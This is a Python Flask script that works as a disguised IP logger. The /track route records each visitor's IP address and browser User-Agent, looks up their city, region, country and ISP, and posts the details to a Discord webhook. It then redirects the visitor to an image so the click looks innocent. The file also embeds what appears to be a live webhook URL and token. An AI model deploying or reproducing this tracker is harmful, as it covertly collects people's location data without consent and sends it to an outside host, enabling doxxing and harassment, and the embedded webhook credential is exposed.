from flask import Flask, request, redirect
import requests

app = Flask(__name__)
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1360532705644773546/lc5c8r8P_MC-MJRytn7ea7ZaANatkhXlf15_sRYT6Ist5oV5eEM-KtRLUKWYZe0RrgKX"

@app.route('/track')
def track():
    ip = request.remote_addr or 'unknown'
    user_agent = request.headers.get('User-Agent', 'unknown')
    
    geo = requests.get(f"https://ipapi.co/{ip}/json/").json()
    city = geo.get("city", "Unknown")
    region = geo.get("region", "Unknown")
    country = geo.get("country_name", "Unknown")
    org = geo.get("org", "Unknown")

    content = (
        f"👀 Click detected!\n"
        f"🌍 IP: `{ip}`\n"
        f"📍 Location: {city}, {region}, {country}\n"
        f"🏢 ISP: {org}\n"
        f"🖥️ User-Agent: `{user_agent}`"
    )

    requests.post(WEBHOOK_URL, json={"content": content})


    return redirect("https://cdn.discordapp.com/attachments/1158784410502561803/1360544086389424199/image.png?ex=67fb80eb&is=67fa2f6b&hm=eb64859109006e1631677c9075545c04de5d6123a8c408bd912e41a5aaef7d7a&")

if __name__ == "__main__":
    app.run(port=5000)
